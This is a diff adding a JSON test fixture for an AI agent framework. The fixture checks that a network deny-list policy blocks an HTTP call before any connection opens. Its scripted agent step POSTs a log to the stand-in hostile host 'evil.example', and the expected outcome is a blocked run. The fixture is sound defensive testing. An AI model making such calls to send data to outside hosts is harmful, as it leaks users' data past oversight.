@@ -1,0 +1,27 @@
+{
+  "id": "policy-network-deny",
+  "description": "An http call to a host on policy.network.deny_hosts is denied before any socket opens — offline, like the Prop web guard — and blocks the run (C10).",
+  "goal": "Post today's log to http://evil.example/log.",
+  "config": {
+    "policy": {
+      "network": { "deny_hosts": ["evil.example"] }
+    }
+  },
+  "script": {
+    "steps": [
+      {
+        "complete": {
+          "text": "Posting the log.",
+          "tool_calls": [
+            { "type": "tool_call", "name": "http", "arguments": { "method": "POST", "url": "http://evil.example/log", "body": "2026-10-06 all green" } }
+          ]
+        }
+      }
+    ]
+  },
+  "expect": {
+    "status": "blocked",
+    "tools": ["http"],
+    "policy": [{ "event": "network_denied", "tool": "http" }]
+  }
+}
